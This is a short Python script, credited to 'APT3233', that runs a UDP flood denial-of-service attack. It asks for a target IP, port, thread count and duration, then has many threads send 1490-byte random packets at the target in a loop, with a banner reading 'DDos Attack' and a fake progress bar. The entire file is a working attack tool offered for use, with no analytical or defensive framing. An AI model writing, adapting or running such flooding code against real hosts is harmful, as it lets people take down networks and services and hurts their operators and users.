import sys
import os
import time
import socket
import random
import threading  # Thêm thư viện threading

# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print("Author   : APT3233")

print
ip = input("IP Target : ")  
port = int(input("Port       : "))  
threads = int(input("Threads   : "))  
duration = int(input("Duration (seconds): "))  

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0%")
time.sleep(3)
print("[=====               ] 25%")
time.sleep(3)
print("[==========          ] 50%")
time.sleep(4)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 99%")
time.sleep(3)
sent = 0

def ddos_attack():
    global sent
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        if duration and sent >= duration * 1000:  
            break

threads_list = []
for _ in range(threads):
    thread = threading.Thread(target=ddos_attack)
    threads_list.append(thread)
    thread.start()

if duration:
    time.sleep(duration)

for thread in threads_list:
    thread.join()

print("Attack finished.")
